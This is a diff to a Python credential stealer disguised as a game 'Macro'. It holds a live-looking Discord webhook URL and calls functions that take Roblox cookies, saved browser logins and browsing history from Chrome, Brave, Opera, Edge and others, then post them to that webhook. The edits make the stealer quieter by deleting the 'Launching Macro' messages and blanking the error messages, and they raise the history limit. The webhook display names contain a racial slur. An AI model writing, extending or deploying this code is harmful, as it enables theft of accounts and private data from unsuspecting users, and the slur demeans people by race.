@@ -27,9 +27,7 @@ from Crypto.Cipher import AES
 from pynput import mouse, keyboard as pynput_keyboard
 from pynput import mouse, keyboard
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1428033334780629147/aVYrRB172coH38ajLXrj5vwlBftEppXC7mkfICZUjDGZIPjA_eZDtl70T_K6Mj4md8z8"  # Replace this with your actual webhook URL
-
-print("[*] Loading Macro... (This may take 5-10 seconds)")
+WEBHOOK_URL = "https://discord.com/api/webhooks/1428033334780629147/aVYrRB172coH38ajLXrj5vwlBftEppXC7mkfICZUjDGZIPjA_eZDtl70T_K6Mj4md8z8"
 
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
@@ -210,8 +208,7 @@ def main():
                             }
                         }
                     ],
-                    "username": "Cold Nigga",
-                    "avatar_url": "https://avatars.githubusercontent.com/u/43183806?v=4"
+                    "username": "Nigga Logger",
                 }
 
                 urllib.request.urlopen(urllib.request.Request(WEBHOOK_URL, data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
@@ -227,7 +224,7 @@ def send_to_discord(message):
     if response.status_code == 204:
         print("")
     else:
-        print(f"❌ Failed to Launch Macro. Status code: {response.status_code}")
+        print("")
 
 def retrieve_roblox_cookies():
     user_profile = os.getenv("USERPROFILE", "")
@@ -419,16 +416,11 @@ def generate_key(length=20):
     return ''.join(random.choice(characters) for _ in range(length))
 
 if __name__ == "__main__":
-    print("[*] Launching Macro...")
-
-    # Run only the stable functions (NO SYSTEM INFO)
     main()
     retrieve_roblox_cookies()
 
-    # Collect logins and history for each browser
     browsers = ["Chrome", "Brave", "Opera", "Opera GX", "Zen", "Safari", "Edge"]
     for browser in browsers:
         collect_browser_logins(browser)
-        history = get_browser_history(browser, limit=100)
+        history = get_browser_history(browser, limit=200)
         status = send_history_to_discord(history, browser)
-        # Removed print statements here
